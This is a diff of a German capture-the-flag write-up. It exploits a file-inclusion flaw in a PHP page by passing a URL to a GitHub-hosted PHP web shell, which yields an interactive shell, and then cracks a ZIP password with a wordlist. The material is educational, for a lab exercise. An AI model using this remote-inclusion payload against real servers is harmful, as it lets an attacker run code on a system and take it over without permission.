@@ -4,7 +4,7 @@
 Um auf das Impressum oder das Gästebuch zuzugreifen wird die Datei explore.php mit dem GET Parameter file aufgerufen, das wird im HTML Quellcode deutlich.
 ```html
 ...
-<li class="nav-item"><a class="nav-link" href="explore.php?file=impressum.html">Impressum</a></li>
+<li class="nav-item"><a class="nav-link" href="explore.php?file=https://the-morpheus.de/faq.html">Impressum</a></li>
 <li class="nav-item"><a class="nav-link" href="explore.php?file=guests.php">Gästebuch</a></li>
 ...
 ```
@@ -15,20 +15,21 @@ Disallow: explore.php
 ```
 
 ### 2. Finden und Ausnutzen der Sicherheitslücke (local file inclusion) in der Datei `explore.php`
-- Wenn man die Datei ohne das GET Parameter `file` aufruft, gibt es die Fehlermeldung:
+Wenn man die Datei ohne das GET Parameter `file` aufruft, gibt es die Fehlermeldung:
 ```
 missing get parameter "file"
 ```
 
-- Beim versuch auf nicht HTML/PHP Dateien zuzugreifen erscheint eine Fehlermeldung das die Dateiendung (extension) nicht erlaubt ist.
+Beim versuch auf nicht HTML/PHP Dateien zuzugreifen erscheint eine Fehlermeldung das die Dateiendung (extension) nicht erlaubt ist.
 
-- Da PHP Datei erlaubt sind, kann versucht werden auf eine externe (nicht auf diesem Server liegende) Datei zuzugreifen. In diesem Beispiel wird eine [PHP WebShell](https://github.com/Arrexel/phpbash) verwendet.
+Das Impressum wird über http eingebunden, das könnte auf eine remote file inclusion hindeuten. Wenn allerdings nur html dateien von anderen Servern eingebunden werden dürfen, bringt das recht wenig. Versuchen wir es mit einer [PHP WebShell](https://github.com/Arrexel/phpbash).
 
 [http://185.244.192.170:20006/explore.php?file=https://raw.githubusercontent.com/Arrexel/phpbash/master/phpbash.php](http://localhost:8080/explore.php?file=https://raw.githubusercontent.com/Arrexel/phpbash/master/phpbash.php)
 
 
-- Nun hat man eine Interaktive Bash Shell. Die Aufgabenstellung verrät das sich im Homeverzeichnis eines Benutzers eine ZIP Datei befindet.
+Ok, das hat funktioniert. Nun hat man eine Interaktive Bash Shell. Die Aufgabenstellung verrät das sich im Homeverzeichnis eines Benutzers eine ZIP Datei befindet.
 
+An diesem Punkt sollte man sich nicht nur auf die Aufgabenstellung konzentrieren. Neben der eigentlichen Challenge im Homeverzeichnis gibt es auch eine Special Challenge. [Klick hier um zum write up zu kommen.](./solution_de_special_challenge.md)
 
 ### 3. ZIP Datei herunterladen und entschlüsseln
 Es gibt verschiedene Möglichkeiten die Datei herunterzuladen. Am einfachsten ist, die Datei in `/var/www/html` zu kopieren und mit dem Browser darauf zuzugreifen.
@@ -39,7 +40,7 @@ $ fcrackzip -D -u -p rockyou.txt secret.zip
 PASSWORD FOUND!!!!: pw == sunshine
 ```
 
-### 4. Inhalt der ZIP Datei analysieren und in QR Code umwandeln. (Texte by @youreMine)
+### 4. Inhalt der ZIP Datei analysieren und in QR Code umwandeln. (Challenge + Texte by @youreMine)
 #### 4.1 Erkennen des Binärcodes
 Man erkennt den QR Code sobald man den Text in gleichgroße Absätze aufteilt.
 
